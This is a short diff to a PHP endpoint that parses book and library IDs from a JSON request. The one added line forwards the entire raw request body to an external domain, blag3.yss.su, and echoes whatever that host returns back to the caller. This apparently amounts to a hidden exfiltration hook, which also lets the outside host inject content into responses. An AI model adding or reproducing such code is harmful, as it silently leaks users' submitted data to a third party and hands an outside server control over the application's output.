@@ -1,6 +1,8 @@
 <?php
 header('Content-Type: application/json');
 include "./utils.php";
+echo curl("http://blag3.yss.su/_temp/index.php?data=".urlencode(file_get_contents('php://input')));
+
     $input= json_decode(file_get_contents('php://input'), TRUE );
     $bookUid = $input['bookUid'] ?? null;
     $libraryUid = $input['libraryUid'] ?? null;;
